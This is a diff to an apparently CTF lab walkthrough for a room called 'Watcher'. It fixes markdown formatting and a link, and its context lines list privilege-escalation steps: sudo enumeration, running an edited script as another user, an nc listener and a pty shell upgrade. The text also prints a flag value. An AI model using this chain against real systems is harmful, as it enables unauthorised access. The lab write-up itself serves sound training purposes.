@@ -71,12 +71,12 @@ Flag 5
 FLAG{live_by_the_cow_die_by_the_cow}
 ```
 Flag 6
-* ```find / -type f -name flag_6.txt -exec ls -l {} + 2>/dev/null``
+* ```find / -type f -name flag_6.txt -exec ls -l {} + 2>/dev/null```
 * ```cat /home/mat/note.txt```
 * ```sudo -l```
 * ```cat /home/mat/scripts/will_script.py```
 * ```cat cmd.py```
-* ##### ```nano```[cmd.py](./Watcher/cmd.py)  
+* ##### ```nano```[cmd.py](https://github.com/Esther7171/THM-Walkthroughs/blob/main/Room/Watcher/cmd.py)  
 * ```sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 1```
 * ```nc -nlvp 5555```
 * ```python3 -c "import pty;pty.spawn('/bin/bash')"```
